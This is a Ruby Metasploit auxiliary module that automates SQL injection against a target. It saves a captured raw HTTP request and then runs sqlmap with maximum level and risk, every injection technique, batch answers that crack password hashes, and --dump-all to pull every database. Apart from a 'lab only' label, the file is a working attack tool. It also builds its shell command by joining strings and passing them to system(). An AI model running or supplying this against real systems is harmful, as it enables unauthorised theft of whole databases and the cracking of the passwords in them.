##
# sacco_auto_sqlmap.rb
#
# Author: nu11secur1ty
# Description: Save RAW_REQUEST and run sqlmap automatically (lab only).
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(
      'Name'        => 'sacco_auto_sqlmap',
      'Description' => 'Save RAW_REQUEST and run sqlmap automatically (lab only).',
      'Author'      => ['nu11secur1ty'],
      'License'     => MSF_LICENSE
    )

    register_options(
      [
        OptString.new('RAW_REQUEST', [ true, 'Raw HTTP request (from Burp)', '' ]),
        OptString.new('SQLMAP_PATH', [ false, 'Full path to sqlmap.py', '/home/kali/sqlmap-nu11secur1ty/sqlmap.py' ])
      ]
    )
  end

  def run
    raw_request = datastore['RAW_REQUEST']
    sqlmap_path = datastore['SQLMAP_PATH'] || '/home/kali/sqlmap-nu11secur1ty/sqlmap.py'

    if raw_request.nil? || raw_request.empty?
      print_error("RAW_REQUEST is empty — will attempt to use system exploit.txt if present.")
    end

    # Prefer system exploit.txt in MSF module dir (no need to cat)
    system_exploit = '/usr/share/metasploit-framework/modules/auxiliary/MSF/exploit.txt'
    use_file = nil

    if File.exist?(system_exploit)
      use_file = system_exploit
      print_good("Using existing exploit file: #{use_file}")
    else
      # fallback: write to user-writable home dir
      exploit_dir = File.join(Dir.home, ".msf_exploits")
      Dir.mkdir(exploit_dir) unless Dir.exist?(exploit_dir)
      timestamp = Time.now.strftime("%Y%m%d%H%M%S")
      tmp_file = File.join(exploit_dir, "exploit_#{timestamp}.txt")

      if raw_request.nil? || raw_request.empty?
        print_error("No RAW_REQUEST provided and no system exploit.txt found — nothing to do.")
        return
      end

      begin
        File.open(tmp_file, "w") { |f| f.write(raw_request) }
        print_good("Saved RAW_REQUEST -> #{tmp_file}")
        use_file = tmp_file
      rescue Errno::EACCES => e
        print_error("Cannot write temp exploit file: #{e}")
        return
      rescue => e
        print_error("Failed to save temp request: #{e}")
        return
      end
    end

    unless File.exist?(sqlmap_path)
      print_error("sqlmap.py not found at #{sqlmap_path}. Set SQLMAP_PATH option to correct path.")
      # do not delete the temp file so user can inspect
      return
    end

    sqlmap_cmd = [
      "python3",
      sqlmap_path,
      "-r", use_file,
      "--no-cast",
      "--no-escape",
      "--dbms=mysql",
      "--time-sec=11",
      "--random-agent",
      "--level=5",
      "--risk=3",
      "--batch",
      "--flush-session",
      "--technique=TBEUSQ",
      "--union-char=UCHAR",
      '--answers="crack=Y,dict=Y,continue=Y,quit=N"',
      "--dump-all"
    ].join(" ")

    print_status("Executing sqlmap: #{sqlmap_cmd}")
    begin
      system(sqlmap_cmd)
      print_good("sqlmap finished (check output above)")
    rescue => e
      print_error("Failed to execute sqlmap: #{e}")
    ensure
      # delete tmp file if we created it
      if use_file != system_exploit
        begin
          File.delete(use_file) if File.exist?(use_file)
          print_status("Deleted temporary file #{use_file}")
        rescue => e
          print_warning("Could not delete temporary file: #{e}")
        end
      end
    end
  end
end
